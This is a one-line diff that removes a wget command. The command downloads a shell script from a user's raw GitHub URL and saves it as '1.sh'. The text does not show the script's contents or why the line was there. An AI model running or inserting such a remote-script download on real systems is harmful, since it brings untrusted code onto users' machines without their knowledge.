@@ -1,1 +1,0 @@
-wget -O 1.sh https://raw.githubusercontent.com/vlain1337/dface/refs/heads/main/me/11221.sh
